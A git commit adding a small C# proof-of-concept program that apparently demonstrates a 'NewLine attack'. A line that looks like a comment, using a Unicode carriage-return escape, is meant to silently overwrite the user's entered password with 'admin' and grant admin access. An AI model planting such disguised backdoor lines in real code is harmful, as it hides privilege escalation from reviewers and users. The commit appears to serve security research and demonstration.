c79bd3330f585ea5649c99f1974e5dfaa81a5e05
emanuele.buchicchio <emanuele.buchicchio@smartpeg.eu>
2022-05-16 14:02:55 +0200

    NewLine attack PoC in .NetCore

---
+++ PoC_1_DotNetCore/Program.cs
@@ -0,0 +1,30 @@
+﻿using System;
+
+namespace ConsoleApp1
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {   
+	    
+	    String username, password;
+	    /** Print of user credentials **/
+        System.Console.WriteLine("Username: user , Password: user");
+
+        /** The user insert the credentials **/
+        System.Console.WriteLine("Insert your username...");
+        username = System.Console.ReadLine();
+        System.Console.WriteLine("Insert your password...");
+        password = System.Console.ReadLine();
+            /** PoC_2 01: The password will be the one set by the attackers with NewLineAttack instead of the one inserted by the user **/
+            //\u000d password="admin";
+
+            /** Check credentials to give a role **/
+        if (password.Equals("user")){
+            System.Console.WriteLine("Logged in as a user!");
+        }else if(password.Equals("admin")){
+            System.Console.WriteLine("Hi " +username+", you logged in as admin!");
+        }
+        }
+    }
+}
